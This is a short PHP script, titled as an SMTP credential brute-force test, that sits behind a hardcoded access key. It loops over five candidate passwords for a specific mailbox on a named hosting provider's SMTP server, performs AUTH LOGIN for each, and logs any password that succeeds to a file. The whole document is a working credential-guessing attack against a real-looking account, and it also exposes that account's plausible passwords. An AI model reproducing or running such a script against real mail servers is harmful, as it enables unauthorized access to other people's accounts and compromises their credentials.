<?php
// SMTP Credential Brute-Force Test
$key = $_GET['key'] ?? '';
if ($key !== 'BizCron2024') { die('Unauthorized'); }

$smtp_host = 'ssl://smtp.hostinger.com';
$smtp_port = 465;
$user = 'hello@biznexus.in';
$passwords = ['Hello@biznexus1', 'Biz@9990', 'Skn@123nch', 'BizNexus@123', 'admin@123'];

foreach ($passwords as $pass) {
    echo "Testing Password: $pass ... ";
    $socket = fsockopen($smtp_host, $smtp_port, $errno, $errstr, 10);
    if (!$socket) { echo "Socket Fail ($errno)<br>"; continue; }
    
    fgets($socket, 515); // Clear 220
    fputs($socket, "EHLO smtp.hostinger.com\r\n");
    while($line = fgets($socket, 515)) { if($line[3] === ' ') break; }

    fputs($socket, "AUTH LOGIN\r\n");
    fgets($socket, 515);

    fputs($socket, base64_encode($user) . "\r\n");
    fgets($socket, 515);

    fputs($socket, base64_encode($pass) . "\r\n");
    $res = fgets($socket, 515);
    
    if (strpos($res, '235') !== false) {
        echo "<b style='color:green'>SUCCESS!</b><br>";
        file_put_contents('reset_log.txt', "FOUND WORKING PASS: $pass\n", FILE_APPEND);
    } else {
        echo "<span style='color:red'>FAIL ($res)</span><br>";
    }
    fputs($socket, "QUIT\r\n");
    fclose($socket);
}
?>
